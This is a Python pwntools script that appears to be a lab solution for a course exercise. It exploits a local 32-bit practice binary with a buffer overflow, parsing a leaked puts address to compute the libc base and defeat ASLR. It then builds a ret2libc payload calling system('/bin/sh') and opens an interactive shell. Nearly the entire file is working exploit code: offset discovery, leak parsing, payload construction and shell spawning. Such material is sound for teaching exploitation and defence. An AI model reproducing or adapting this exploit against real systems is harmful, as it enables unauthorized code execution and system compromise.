#!/usr/bin/env python3
"""Solution for Problem 5 (leak32): ret2libc with ASLR ON, via a leaked pointer.

ASLR randomizes only the libc BASE; offsets inside libc are fixed (slide 50).
So one leaked libc address defeats it:

    libc_base = leaked_puts - libc.sym.puts
    system    = libc_base   + libc.sym.system
    /bin/sh   = libc_base   + offset(/bin/sh)

Then the same 32-bit ret2libc frame as Problem 1:  [&system][&exit][&"/bin/sh"].
Turn ASLR ON first:   sudo sysctl -w kernel.randomize_va_space=2

Run:  cd example5 && make && python3 solution5/solve_leak32.py
"""
import os
from pwn import *

context.update(arch="i386", os="linux", log_level="info")

HERE = os.path.dirname(os.path.abspath(__file__))


def runnable(path):
    """/vagrant vboxsf flakily drops the +x bit; always run from an ext4 copy."""
    import shutil, tempfile
    dst = os.path.join(tempfile.mkdtemp(), os.path.basename(path))
    shutil.copy(path, dst)
    os.chmod(dst, 0o755)
    return dst


BIN = runnable(os.path.join(HERE, "..", "leak32"))


def libc_path(io):
    for path in io.libs():
        if "libc.so" in path:
            return path
    raise RuntimeError("libc not found in process maps")


def find_offset():
    io = process(BIN)
    io.recvline()                 # [leak] line
    io.sendline(cyclic(200))
    io.wait()
    off = cyclic_find(io.corefile.eip)
    io.close()
    log.success("offset = %d", off)
    return off


def main():
    offset = find_offset()

    io = process(BIN)
    leak = int(io.recvline_startswith(b"[leak] puts @").split(b"@")[1], 16)

    libc = ELF(libc_path(io), checksec=False)    # address 0 => symbols are offsets
    libc_base = leak - libc.symbols["puts"]      # compute base from the leak
    log.info("leaked puts = %#x -> libc base = %#x", leak, libc_base)
    assert libc_base & 0xFFF == 0, "libc base not page-aligned -- is ASLR on?"

    libc.address = libc_base                     # now symbols resolve absolute
    system = libc.symbols["system"]
    exit_ = libc.symbols["exit"]
    binsh = next(libc.search(b"/bin/sh\x00"))
    log.info("system @ %#x  /bin/sh @ %#x", system, binsh)

    payload = flat(b"A" * offset, system, exit_, binsh)
    io.recvuntil(b"overflow me:\n")
    io.sendline(payload)
    log.success("ASLR bypassed via leak -> system(\"/bin/sh\")")
    io.sendline(b"id; echo PWNED")
    io.interactive()


if __name__ == "__main__":
    main()
